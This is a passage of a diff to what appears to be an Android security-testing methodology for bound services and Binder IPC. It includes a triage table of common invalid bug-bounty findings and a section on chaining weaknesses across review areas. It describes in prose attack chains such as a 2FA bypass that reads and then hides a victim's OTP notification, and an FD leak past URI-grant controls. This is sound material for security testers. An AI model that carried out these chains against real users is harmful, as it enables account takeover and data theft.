-| A HIDL / vendor-AIDL HAL weakness reachable from `adb shell` | Apps talk on `/dev/binder` only; `/dev/hwbinder` and `/dev/vndbinder` are separate contexts, and `shell` is not an app. | Prove an app-reachable framework proxy on `/dev/binder` that forwards to it (D06-067), then it is D25. |
+| A HIDL / vendor-AIDL HAL weakness reachable from `adb shell` | Apps talk on `/dev/binder` only; `/dev/hwbinder` and `/dev/vndbinder` are separate contexts, and `shell` is not an app. | Prove an app-reachable framework proxy on `/dev/binder` that forwards to it (D06-068), then it is D25. |
 | "Root detection in the integrity service is bypassable" | P5 (`lack_of_binary_hardening.lack_of_jailbreak_detection`). Most such services only report signals to a backend — telemetry, not a control. | Show the bypass defeats a control that gates money, DRM or anti-fraud — and if you can *stop* the service from an unprivileged app, report D06-031 instead. |
 | "Foreground-service notification discloses the sync endpoint / job name" | Informational disclosure to the device owner, who already sees the notification. | The notification discloses another user's data, or the service accepts a caller-chosen endpoint (D06-028). |
-| An exported `JobService` you can bind but whose `onStartJob` ignores your parameters | Reachability with no effect. | The job body consumes `JobParameters.getExtras()` and you can steer it (D06-059). |
+| An exported `JobService` you can bind but whose `onStartJob` ignores your parameters | Reachability with no effect. | The job body consumes `JobParameters.getExtras()` and you can steer it (D06-060). |
 | `android:visibleToInstantApps` absent, but you claimed browser reach anyway | Overstated attacker model; it gets the whole report downgraded. | Recheck the attribute. Without it the finding is AM-03, which is still valuable — write it that way. |
 | SQL injection inside a provider-backed service that crosses no permission boundary | Google's invalid-reports guidance: "if an application has permissions to read and write contacts and can use SQL injection to read and write contacts, it is not an issue." Samsung's ineligible list says the same. | Show read-only access escalated to write, or data returned that the caller's permissions do not cover. That sentence is the difference between $0 and a valid High. |
 
@@ -2706,16 +2755,16 @@ These primitives have independent fix surfaces and are filed separately per the 
 - **D06 × D07 — the `ParcelFileDescriptor` that a provider would never have granted.** Provider review
   covers `grantUriPermissions`, path traversal and `openFile`. Binder review covers method authorisation.
   Nobody checks that an AIDL method returns an FD onto a file the provider deliberately does not expose
-  (D06-064). The FD carries the mode it was opened with and bypasses every URI-grant control the app
+  (D06-065). The FD carries the mode it was opened with and bypasses every URI-grant control the app
   designed — including a writable handle into the directory D06-030 needs.
 - **D06 × D13 — the `NotificationListenerService` that reads the OTP the service just triggered.** The
   auth review tests the OTP flow; the IPC review tests the listener. Join them: use an exported service or
-  a `Messenger` code (D06-032) to *trigger* the OTP send, then read the code with the listener (D06-047),
+  a `Messenger` code (D06-032) to *trigger* the OTP send, then read the code with the listener (D06-048),
   then cancel the notification so the victim never sees it. That is a complete 2FA bypass built entirely
   from components each of which is individually "low".
 - **D06 × D15 — the bound service as a shadow-API bridge.** The backend tester works from the web app's
   current API version; the mobile tester works from the manifest. The service's hardcoded endpoint is
-  frequently an older version with weaker auth and more field exposure (D06-075) — and the service will
+  frequently an older version with weaker auth and more field exposure (D06-076) — and the service will
   call it *with the victim's credentials attached* (D06-028). The join is: enumerate the service's
   endpoints, diff them behaviourally against the web API, and drive the weaker one through the service.
 - **D06 × D17 — the unauthenticated method that writes where the loader reads.** Dynamic-code-loading
@@ -2750,7 +2799,8 @@ These primitives have independent fix surfaces and are filed separately per the 
   ("Common Mistakes to Avoid"); sender-of-pending-intents; insecure-machine-to-machine;
   insecure-broadcast-receiver; tapjacking; security-tips (Binder/Messenger, `checkCallingPermission()`,
   never implicit `bindService()`); bound services; intents-and-filters (implicit-service hazard);
-  foreground-service types; behaviour changes for Android 14 and 15 (`FGS_INTRODUCE_TIME_LIMITS`,
+  foreground-service types; behaviour changes for Android 13 (SDK-declared permissions auto-merging into
+  the app manifest), 14 and 15 (`FGS_INTRODUCE_TIME_LIMITS`,
   `FGS_BOOT_COMPLETED_RESTRICTIONS`, `FGS_SAW_RESTRICTIONS`, `BIND_ALLOW_ACTIVITY_STARTS`); quick-settings
   tiles; slices; app widgets; app startup; WorkManager and `JobScheduler`; autofill services; accessibility
   services; `MediaBrowserService`; Android for Cars; Wear Data Layer.
